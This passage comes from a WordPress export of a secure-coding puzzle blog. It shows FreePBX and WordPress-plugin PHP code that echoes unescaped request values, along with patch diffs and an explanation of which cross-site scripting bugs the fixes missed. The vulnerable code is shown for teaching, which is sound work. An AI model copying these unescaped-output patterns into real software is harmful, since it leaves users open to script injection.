-BLZ:&lt;br /&gt;&lt;input type=&quot;text&quot; tooltipText=&quot;Format: Ganzzahl z.B. 1234&quot; id=&quot;gen_BNC&quot; onblur=&quot;checkInput(this, 'ganzzahl')&quot; name=&quot;gen_BNC&quot; value=&quot;&lt;?= isset($_REQUEST['gen_BNC'])?$_REQUEST['gen_BNC']:&quot;&quot;?&gt;&quot; &gt;
+BLZ:&lt;br /&gt;&lt;input type=&quot;text&quot; tooltipText=&quot;Format: Ganzzahl z.B. 1234&quot; id=&quot;gen_BNC&quot; onblur=&quot;checkInput(this, 'ganzzahl')&quot; name=&quot;gen_BNC&quot; value=&quot;&lt;?= isset($_REQUEST['gen_BNC'])?htmlspecialchars($_REQUEST['gen_BNC']):&quot;&quot;?&gt;&quot; &gt;
&lt;br /&gt;
-Betrag in Euro (z.B. 1234,50) &lt;br /&gt;&lt;input type=&quot;text&quot; tooltipText=&quot;Format: Dezimalzahl z.B. 1234,50&quot; onblur=&quot;checkInput(this, 'dezimalzahl')&quot; id=&quot;gen_amount&quot; name=&quot;gen_amount&quot; value=&quot;&lt;?= isset($_REQUEST['gen_amount'])?$_REQUEST['gen_amount']:&quot;&quot;?&gt;&quot; &gt;
+Betrag in Euro (z.B. 1234,50) &lt;br /&gt;&lt;input type=&quot;text&quot; tooltipText=&quot;Format: Dezimalzahl z.B. 1234,50&quot; onblur=&quot;checkInput(this, 'dezimalzahl')&quot; id=&quot;gen_amount&quot; name=&quot;gen_amount&quot; value=&quot;&lt;?= isset($_REQUEST['gen_amount'])?htmlspecialchars($_REQUEST['gen_amount']):&quot;&quot;?&gt;&quot; &gt;
&lt;br /&gt;
-Verwendungszweck:&lt;br /&gt;&lt;input type=&quot;text&quot; id=&quot;gen_reason&quot; tooltipText=&quot;Format: DTAUS Text&quot; onblur=&quot;checkInput(this, 'dtaus')&quot; name=&quot;gen_reason&quot; maxlength=&quot;54&quot; value=&quot;&lt;?= isset($_REQUEST['gen_reason'])?$_REQUEST['gen_reason']:&quot;&quot;?&gt;&quot; &gt;
+Verwendungszweck:&lt;br /&gt;&lt;input type=&quot;text&quot; id=&quot;gen_reason&quot; tooltipText=&quot;Format: DTAUS Text&quot; onblur=&quot;checkInput(this, 'dtaus')&quot; name=&quot;gen_reason&quot; maxlength=&quot;54&quot; value=&quot;&lt;?= isset($_REQUEST['gen_reason'])?htmlspecialchars($_REQUEST['gen_reason']):&quot;&quot;?&gt;&quot; &gt;
&lt;br/&gt;
&lt;input type=&quot;button&quot; value=&quot;Erstellen&quot; onclick='javascript:generateImage();'&gt;
&lt;/form&gt;
&lt;?php if(!(get_option(&quot;bezahlcode_showlink&quot;) == &quot;hidden&quot;)) {	?&gt;
&lt;br /&gt;
&lt;span class=&quot;bezahlCodeLink&quot;&gt;Weitere Informationen: &lt;a href=&quot;http://www.bezahlcode.de&quot; title=&quot;BezahlCode - Schnell, einfach und sicher bezahlen&quot; target=&quot;_blank&quot;&gt;www.bezahlcode.de&lt;/a&gt;&lt;/span&gt;
&lt;?php } ?&gt;
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
var tooltipObj = new DHTMLgoodies_formTooltip();
tooltipObj.initFormFieldTooltip();
&lt;/script&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1326</wp:post_id>
		<wp:post_date>2011-02-18 06:31:20</wp:post_date>
		<wp:post_date_gmt>2011-02-18 13:31:20</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>radical-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/ffI5yX]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[f6116e60b82ac890760a3c7ab00095c4]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1656</wp:comment_id>
			<wp:comment_author><![CDATA[DisK0nn3cT]]></wp:comment_author>
			<wp:comment_author_email>danny@devtrixlabs.com</wp:comment_author_email>
			<wp:comment_author_url>http://www.devtrixlabs.com</wp:comment_author_url>
			<wp:comment_author_IP>74.7.52.30</wp:comment_author_IP>
			<wp:comment_date>2011-02-18 06:52:51</wp:comment_date>
			<wp:comment_date_gmt>2011-02-18 13:52:51</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Another comment, although not entirely security related, is that you should always use &lt;?php rather than &lt;? as a best practice. Some servers will not recognize the &lt;? as an open PHP tag and can cause unwanted errors.

Great post, I love reading these every week.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:14:"1298037171.593";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1298270950.2705";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Reasoning</title>
		<link>http://spotthevuln.com/2011/02/reasoning/</link>
		<pubDate>Mon, 21 Feb 2011 12:49:55 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1328</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Man is a reasoning rather than a reasonable animal.</strong> <br><strong>  - Alexander Hamilton.
</strong></blockquote>
[sourcecode language="php"]
&lt;?php 
$tabindex = 0;
$display = 'customdests';

$type   = isset($_REQUEST['type']) ? $_REQUEST['type'] : 'tool';
$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : '';
if (isset($_REQUEST['delete'])) $action = 'delete'; 

$old_custom_dest = isset($_REQUEST['old_custom_dest']) ? $_REQUEST['old_custom_dest'] :  '';
$custom_dest     = isset($_REQUEST['extdisplay']) ? $_REQUEST['extdisplay'] :  '';
$description     = isset($_REQUEST['description']) ? $_REQUEST['description'] :  '';
$notes           = isset($_REQUEST['notes']) ? $_REQUEST['notes'] :  '';

switch ($action) {
	case 'add':
		if (customappsreg_customdests_add($custom_dest, $description, $notes)) {
			needreload();
			redirect_standard();
		} else {
			$custom_dest='';
		}
	break;
	case 'edit':
		if (customappsreg_customdests_edit($old_custom_dest, $custom_dest, $description, $notes)) {
			needreload();
			redirect_standard('extdisplay');
		}
	break;
	case 'delete':
		customappsreg_customdests_delete($custom_dest);
		needreload();
		redirect_standard();
	break;
}

?&gt; 
&lt;/div&gt;

&lt;div class=&quot;rnav&quot;&gt;&lt;ul&gt;
&lt;?php 

echo '&lt;li&gt;&lt;a href=&quot;config.php?display='.$display.'&amp;amp;type='.$type.'&quot;&gt;'._('Add Custom Destination').'&lt;/a&gt;&lt;/li&gt;';

foreach (customappsreg_customdests_list() as $row) {
	$descr = $row['description'] != '' ? $row['description'] : '('.$row['custom_dest'].')';
	echo '&lt;li&gt;&lt;a href=&quot;config.php?display='.$display.'&amp;amp;type='.$type.'&amp;amp;extdisplay='.$row['custom_dest'].'&quot; class=&quot;&quot;&gt;'.$descr.'&lt;/a&gt;&lt;/li&gt;';
}

?&gt;
&lt;/ul&gt;&lt;/div&gt;

&lt;div class=&quot;content&quot;&gt;

&lt;?php

if ($custom_dest != '') {
	// load
	$usage_list = framework_display_destination_usage(customappsreg_customdests_getdest($custom_dest));

	$row = customappsreg_customdests_get($custom_dest);
	
	$description = $row['description'];
	$notes       = $row['notes'];

	$disp_description = $row['description'] != '' ? $row['description'] : '('.$row['custom_dest'].')';
	echo &quot;&lt;h2&gt;&quot;._(&quot;Edit: &quot;).&quot;$disp_description&quot;.&quot;&lt;/h2&gt;&quot;;
} else {
	echo &quot;&lt;h2&gt;&quot;._(&quot;Add Custom Destination&quot;).&quot;&lt;/h2&gt;&quot;;
}

$helptext = _(&quot;Custom Destinations allows you to register your custom destinations that point to custom dialplans and will also 'publish' these destinations as available destinations to other modules. This is an advanced feature and should only be used by knowledgeable users. If you are getting warnings or errors in the notification panel about CUSTOM destinations that are correct, you should include them here. The 'Unknown Destinations' chooser will allow you to choose and insert any such destinations that the registry is not aware of into the Custom Destination field.&quot;);
echo $helptext;
?&gt;

&lt;form name=&quot;editCustomDest&quot; action=&quot;&lt;?php  $_SERVER['PHP_SELF'] ?&gt;&quot; method=&quot;post&quot; onsubmit=&quot;return checkCustomDest(editCustomDest);&quot;&gt;
	&lt;input type=&quot;hidden&quot; name=&quot;extdisplay&quot; value=&quot;&lt;?php echo $custom_dest; ?&gt;&quot;&gt;
	&lt;input type=&quot;hidden&quot; name=&quot;old_custom_dest&quot; value=&quot;&lt;?php echo $custom_dest; ?&gt;&quot;&gt;
	&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;&lt;?php echo ($custom_dest != '' ? 'edit' : 'add'); ?&gt;&quot;&gt;
	&lt;table&gt;
	&lt;tr&gt;&lt;td colspan=&quot;2&quot;&gt;&lt;h5&gt;&lt;?php  echo ($custom_dest ? _(&quot;Edit Custom Destination&quot;) : _(&quot;Add Custom Destination&quot;)) ?&gt;&lt;hr&gt;&lt;/h5&gt;&lt;/td&gt;&lt;/tr&gt;
	&lt;tr&gt;
		&lt;td&gt;&lt;a href=&quot;#&quot; class=&quot;info&quot;&gt;&lt;?php echo _(&quot;Custom Destination&quot;)?&gt;:
			&lt;span&gt;
				&lt;?php 
				echo _(&quot;This is the Custom Destination to be published. It should be formatted exactly as you would put it in a goto statement, with context, exten, priority all included. An example might look like:&lt;br /&gt;mycustom-app,s,1&quot;);
				if (!empty($usage_list)) {
					echo &quot;&lt;br /&gt;&quot;._(&quot;READONLY WARNING: Because this destination is being used by other module objects it can not be edited. You must remove those dependencies in order to edit this destination, or create a new destination to use&quot;);
				}
				?&gt;
			&lt;/span&gt;&lt;/a&gt;&lt;/td&gt;
	&lt;?php
	if (!empty($usage_list)) {
	?&gt;
		&lt;td&gt;&lt;b&gt;&lt;?php echo $custom_dest; ?&gt;&lt;/b&gt;&lt;/td&gt;
	&lt;?php
	} else {
	?&gt;
		&lt;td&gt;&lt;input size=&quot;30&quot; type=&quot;text&quot; name=&quot;extdisplay&quot; id=&quot;extdisplay&quot; value=&quot;&lt;?php  echo $custom_dest; ?&gt;&quot; tabindex=&quot;&lt;?php echo ++$tabindex;?&gt;&quot;&gt;&lt;/td&gt;
	&lt;?php
	}
	?&gt;
	&lt;/tr&gt;

	&lt;?php
	if (empty($usage_list)) {
	?&gt;
	&lt;tr&gt;
		&lt;td&gt;
		&lt;a href=# class=&quot;info&quot;&gt;&lt;?php echo _(&quot;Destination Quick Pick&quot;)?&gt;
			&lt;span&gt;
				&lt;?php echo _(&quot;Choose un-identified destinations on your system to add to the Custom Destination Registry. This will insert the chosen entry into the Custom Destination box above.&quot;)?&gt;
			&lt;/span&gt;
		&lt;/a&gt;
		&lt;/td&gt;
		&lt;td&gt;
			&lt;select onChange=&quot;insertDest();&quot; id=&quot;insdest&quot; tabindex=&quot;&lt;?php echo ++$tabindex;?&gt;&quot;&gt;
				&lt;option value=&quot;&quot;&gt;&lt;?php echo _(&quot;(pick destination)&quot;)?&gt;&lt;/option&gt;
	&lt;?php
				$results = customappsreg_customdests_getunknown();
				foreach ($results as $thisdest) {
					echo &quot;&lt;option value='$thisdest'&gt;$thisdest&lt;/option&gt;\n&quot;;
				}
	?&gt;
			&lt;/select&gt;
		&lt;/td&gt;
	&lt;/tr&gt;
	&lt;?php
	}
	?&gt;

	&lt;tr&gt;
		&lt;td&gt;&lt;a href=&quot;#&quot; class=&quot;info&quot;&gt;&lt;?php echo _(&quot;Description&quot;)?&gt;:&lt;span&gt;&lt;?php echo _(&quot;Brief Description that will be published to modules when showing destinations. Example: My Weather App&quot;)?&gt;&lt;/span&gt;&lt;/a&gt;&lt;/td&gt;
		&lt;td&gt;&lt;input size=&quot;30&quot; type=&quot;text&quot; name=&quot;description&quot; value=&quot;&lt;?php  echo $description; ?&gt;&quot; tabindex=&quot;&lt;?php echo ++$tabindex;?&gt;&quot;&gt;&lt;/td&gt;
	&lt;/tr&gt;
	&lt;tr&gt;
		&lt;td valign=&quot;top&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;info&quot;&gt;&lt;?php echo _(&quot;Notes&quot;)?&gt;:&lt;span&gt;&lt;?php echo _(&quot;More detailed notes about this destination to help document it. This field is not used elsewhere.&quot;)?&gt;&lt;/span&gt;&lt;/a&gt;&lt;/td&gt;
		&lt;td&gt;&lt;textarea name=&quot;notes&quot; cols=&quot;23&quot; rows=&quot;6&quot; tabindex=&quot;&lt;?php echo ++$tabindex;?&gt;&quot;&gt;&lt;?php echo $notes; ?&gt;&lt;/textarea&gt;&lt;/td&gt; 
	&lt;/tr&gt;

	&lt;tr&gt;
		&lt;td colspan=&quot;2&quot;&gt;&lt;br&gt;&lt;input name=&quot;Submit&quot; type=&quot;submit&quot; value=&quot;&lt;?php echo _(&quot;Submit Changes&quot;)?&gt;&quot; tabindex=&quot;&lt;?php echo ++$tabindex;?&gt;&quot;&gt;
		&lt;?php if ($custom_dest != '') { echo '&amp;nbsp;&lt;input name=&quot;delete&quot; type=&quot;submit&quot; value=&quot;'._(&quot;Delete&quot;).'&quot;&gt;'; } ?&gt;
		&lt;/td&gt;		

		&lt;?php
		if ($custom_dest != '') {
			if (!empty($usage_list)) {
			?&gt;
				&lt;tr&gt;&lt;td colspan=&quot;2&quot;&gt;
				&lt;a href=&quot;#&quot; class=&quot;info&quot;&gt;&lt;?php echo $usage_list['text']?&gt;:&lt;span&gt;&lt;?php echo $usage_list['tooltip']?&gt;&lt;/span&gt;&lt;/a&gt;
				&lt;/td&gt;&lt;/tr&gt;
			&lt;?php
			}
		}
		?&gt;
	&lt;/tr&gt;
	&lt;/table&gt;
	&lt;/form&gt;
...snip...
&lt;/script&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1328</wp:post_id>
		<wp:post_date>2011-02-21 05:49:55</wp:post_date>
		<wp:post_date_gmt>2011-02-21 12:49:55</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>reasoning</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/fpaIl5]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[c48300917919b56caa0d409de725dd89]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1668</wp:comment_id>
			<wp:comment_author><![CDATA[Tweets that mention Code Snippet Vulnerability Code Example «SpotTheVuln.com -- Topsy.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://topsy.com/spotthevuln.com/2011/02/reasoning/?utm_source=pingback&amp;utm_campaign=L2</wp:comment_author_url>
			<wp:comment_author_IP>208.74.66.43</wp:comment_author_IP>
			<wp:comment_date>2011-02-21 12:09:00</wp:comment_date>
			<wp:comment_date_gmt>2011-02-21 19:09:00</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] This post was mentioned on Twitter by Manish Saindane, Spot The Vuln. Spot The Vuln said: New Post: Reasoning http://bit.ly/fpaIl5 #secure #code #dev [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1298315340.4508";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1298612277.8681";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Reasoning - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2011/02/reasoning-cross-site-scripting/</link>
		<pubDate>Fri, 25 Feb 2011 12:41:13 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1331</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>Details</h3>
Affected Software: FreePBX

Fixed in Version: 2.9

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Radical" href="http://spotthevuln.com/2011/02/reasoning/" target="_blank">Found    Here</a>
<h3>Description</h3>
To be honest, I was a little confused by this week’s patch.  There are several XSS bugs in this code.  Originally, the vulnerable code would take a tainted $_REQUEST value (a value from a GET, POST, or cookie) and assign the tainted value to a couple of different PHP variables ($description and $notes in particular).  The application then uses of these tainted values on lines 136 and 140, resulting in XSS.  The developer addressed these XSS issues by html encoding the $_REQUEST values before assigning them to PHP variables.  In the code mentioned above, the developer decided to encode/sanitize at the point of assignment (as opposed to the point of consumption).  There are differing perspectives as to whether one should encode/sanitize upon assignment or consumption, but the truth is both methods work.  

What’s confusing is the code sample contains many symptoms that are exactly like the vulnerable code patched by this security patch.  $type, $action, $old_custom_dest, and $custom_dest are all set in exactly the same way the patched assignments were.  For some reason, the developer chose to ignore these assignments even though they are only a few lines away. Also, instead of encoding at the point of assignment (like they did for $description and $notes), the developer chose to change styles and encode at the point of consumption for one of the tainted variables (see line 96 and 97).  What’s even more confusing is only 4 lines later, we see the developer missed the same tainted variable used in an echo and failed to encode the tainted $custom_dest variable resulting in XSS.  Lines 77 – 79 also contain XSS vulnerabilities that were missed in this patch.

<h3>Developers Solution</h3>
[sourcecode language="diff" highlight="11-14,77,78,79,96,97,136,140"]
&lt;?php 
$tabindex = 0;
$display = 'customdests';

$type   = isset($_REQUEST['type']) ? $_REQUEST['type'] : 'tool';
$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : '';
if (isset($_REQUEST['delete'])) $action = 'delete'; 

$old_custom_dest = isset($_REQUEST['old_custom_dest']) ? $_REQUEST['old_custom_dest'] :  '';
$custom_dest     = isset($_REQUEST['extdisplay']) ? $_REQUEST['extdisplay'] :  '';
-$description     = isset($_REQUEST['description']) ? $_REQUEST['description'] :  '';
-$notes           = isset($_REQUEST['notes']) ? $_REQUEST['notes'] :  '';
+$description     = isset($_REQUEST['description']) ? htmlentities($_REQUEST['description']) :  ''; 
+$notes           = isset($_REQUEST['notes']) ? htmlentities($_REQUEST['notes']) :  ''; 
	
switch ($action) {
	case 'add':
		if (customappsreg_customdests_add($custom_dest, $description, $notes)) {
			needreload();
			redirect_standard();
		} else {
			$custom_dest='';
		}
	break;
	case 'edit':
		if (customappsreg_customdests_edit($old_custom_dest, $custom_dest, $description, $notes)) {
			needreload();
			redirect_standard('extdisplay');
		}
	break;
	case 'delete':
		customappsreg_customdests_delete($custom_dest);
		needreload();
		redirect_standard();
	break;
}

?&gt; 
&lt;/div&gt;

&lt;div class=&quot;rnav&quot;&gt;&lt;ul&gt;
&lt;?php 

echo '&lt;li&gt;&lt;a href=&quot;config.php?display='.$display.'&amp;amp;type='.$type.'&quot;&gt;'._('Add Custom Destination').'&lt;/a&gt;&lt;/li&gt;';

foreach (customappsreg_customdests_list() as $row) {
	$descr = $row['description'] != '' ? $row['description'] : '('.$row['custom_dest'].')';
	echo '&lt;li&gt;&lt;a href=&quot;config.php?display='.$display.'&amp;amp;type='.$type.'&amp;amp;extdisplay='.$row['custom_dest'].'&quot; class=&quot;&quot;&gt;'.$descr.'&lt;/a&gt;&lt;/li&gt;';
}

?&gt;
&lt;/ul&gt;&lt;/div&gt;

&lt;div class=&quot;content&quot;&gt;

&lt;?php

if ($custom_dest != '') {
	// load
	$usage_list = framework_display_destination_usage(customappsreg_customdests_getdest($custom_dest));

	$row = customappsreg_customdests_get($custom_dest);
	
	$description = $row['description'];
	$notes       = $row['notes'];

	$disp_description = $row['description'] != '' ? $row['description'] : '('.$row['custom_dest'].')';
	echo &quot;&lt;h2&gt;&quot;._(&quot;Edit: &quot;).&quot;$disp_description&quot;.&quot;&lt;/h2&gt;&quot;;
} else {
	echo &quot;&lt;h2&gt;&quot;._(&quot;Add Custom Destination&quot;).&quot;&lt;/h2&gt;&quot;;
}

$helptext = _(&quot;Custom Destinations allows you to register your custom destinations that point to custom dialplans and will also 'publish' these destinations as available destinations to other modules. This is an advanced feature and should only be used by knowledgeable users. If you are getting warnings or errors in the notification panel about CUSTOM destinations that are correct, you should include them here. The 'Unknown Destinations' chooser will allow you to choose and insert any such destinations that the registry is not aware of into the Custom Destination field.&quot;);
echo $helptext;
?&gt;

&lt;form name=&quot;editCustomDest&quot; action=&quot;&lt;?php  $_SERVER['PHP_SELF'] ?&gt;&quot; method=&quot;post&quot; onsubmit=&quot;return checkCustomDest(editCustomDest);&quot;&gt;
	&lt;input type=&quot;hidden&quot; name=&quot;extdisplay&quot; value=&quot;&lt;?php echo $custom_dest; ?&gt;&quot;&gt;
	&lt;input type=&quot;hidden&quot; name=&quot;old_custom_dest&quot; value=&quot;&lt;?php echo $custom_dest; ?&gt;&quot;&gt;
	&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;&lt;?php echo ($custom_dest != '' ? 'edit' : 'add'); ?&gt;&quot;&gt;
	&lt;table&gt;
	&lt;tr&gt;&lt;td colspan=&quot;2&quot;&gt;&lt;h5&gt;&lt;?php  echo ($custom_dest ? _(&quot;Edit Custom Destination&quot;) : _(&quot;Add Custom Destination&quot;)) ?&gt;&lt;hr&gt;&lt;/h5&gt;&lt;/td&gt;&lt;/tr&gt;
	&lt;tr&gt;
		&lt;td&gt;&lt;a href=&quot;#&quot; class=&quot;info&quot;&gt;&lt;?php echo _(&quot;Custom Destination&quot;)?&gt;:
			&lt;span&gt;
				&lt;?php 
				echo _(&quot;This is the Custom Destination to be published. It should be formatted exactly as you would put it in a goto statement, with context, exten, priority all included. An example might look like:&lt;br /&gt;mycustom-app,s,1&quot;);
				if (!empty($usage_list)) {
					echo &quot;&lt;br /&gt;&quot;._(&quot;READONLY WARNING: Because this destination is being used by other module objects it can not be edited. You must remove those dependencies in order to edit this destination, or create a new destination to use&quot;);
				}
				?&gt;
			&lt;/span&gt;&lt;/a&gt;&lt;/td&gt;
	&lt;?php
	if (!empty($usage_list)) {
	?&gt;
-		&lt;td&gt;&lt;b&gt;&lt;?php echo $custom_dest; ?&gt;&lt;/b&gt;&lt;/td&gt;
+	    &lt;td&gt;&lt;b&gt;&lt;?php echo htmlentities($custom_dest); ?&gt;&lt;/b&gt;&lt;/td&gt; 
	&lt;?php
	} else {
	?&gt;
		&lt;td&gt;&lt;input size=&quot;30&quot; type=&quot;text&quot; name=&quot;extdisplay&quot; id=&quot;extdisplay&quot; value=&quot;&lt;?php  echo $custom_dest; ?&gt;&quot; tabindex=&quot;&lt;?php echo ++$tabindex;?&gt;&quot;&gt;&lt;/td&gt;
	&lt;?php
	}
	?&gt;
	&lt;/tr&gt;

	&lt;?php
	if (empty($usage_list)) {
	?&gt;
	&lt;tr&gt;
		&lt;td&gt;
		&lt;a href=# class=&quot;info&quot;&gt;&lt;?php echo _(&quot;Destination Quick Pick&quot;)?&gt;
			&lt;span&gt;
				&lt;?php echo _(&quot;Choose un-identified destinations on your system to add to the Custom Destination Registry. This will insert the chosen entry into the Custom Destination box above.&quot;)?&gt;
			&lt;/span&gt;
		&lt;/a&gt;
		&lt;/td&gt;
		&lt;td&gt;
			&lt;select onChange=&quot;insertDest();&quot; id=&quot;insdest&quot; tabindex=&quot;&lt;?php echo ++$tabindex;?&gt;&quot;&gt;
				&lt;option value=&quot;&quot;&gt;&lt;?php echo _(&quot;(pick destination)&quot;)?&gt;&lt;/option&gt;
	&lt;?php
				$results = customappsreg_customdests_getunknown();
				foreach ($results as $thisdest) {
					echo &quot;&lt;option value='$thisdest'&gt;$thisdest&lt;/option&gt;\n&quot;;
				}
	?&gt;
			&lt;/select&gt;
		&lt;/td&gt;
	&lt;/tr&gt;
	&lt;?php
	}
	?&gt;

	&lt;tr&gt;
		&lt;td&gt;&lt;a href=&quot;#&quot; class=&quot;info&quot;&gt;&lt;?php echo _(&quot;Description&quot;)?&gt;:&lt;span&gt;&lt;?php echo _(&quot;Brief Description that will be published to modules when showing destinations. Example: My Weather App&quot;)?&gt;&lt;/span&gt;&lt;/a&gt;&lt;/td&gt;
		&lt;td&gt;&lt;input size=&quot;30&quot; type=&quot;text&quot; name=&quot;description&quot; value=&quot;&lt;?php  echo $description; ?&gt;&quot; tabindex=&quot;&lt;?php echo ++$tabindex;?&gt;&quot;&gt;&lt;/td&gt;
	&lt;/tr&gt;
	&lt;tr&gt;
		&lt;td valign=&quot;top&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;info&quot;&gt;&lt;?php echo _(&quot;Notes&quot;)?&gt;:&lt;span&gt;&lt;?php echo _(&quot;More detailed notes about this destination to help document it. This field is not used elsewhere.&quot;)?&gt;&lt;/span&gt;&lt;/a&gt;&lt;/td&gt;
		&lt;td&gt;&lt;textarea name=&quot;notes&quot; cols=&quot;23&quot; rows=&quot;6&quot; tabindex=&quot;&lt;?php echo ++$tabindex;?&gt;&quot;&gt;&lt;?php echo $notes; ?&gt;&lt;/textarea&gt;&lt;/td&gt; 
	&lt;/tr&gt;

	&lt;tr&gt;
		&lt;td colspan=&quot;2&quot;&gt;&lt;br&gt;&lt;input name=&quot;Submit&quot; type=&quot;submit&quot; value=&quot;&lt;?php echo _(&quot;Submit Changes&quot;)?&gt;&quot; tabindex=&quot;&lt;?php echo ++$tabindex;?&gt;&quot;&gt;
		&lt;?php if ($custom_dest != '') { echo '&amp;nbsp;&lt;input name=&quot;delete&quot; type=&quot;submit&quot; value=&quot;'._(&quot;Delete&quot;).'&quot;&gt;'; } ?&gt;
		&lt;/td&gt;		

		&lt;?php
		if ($custom_dest != '') {
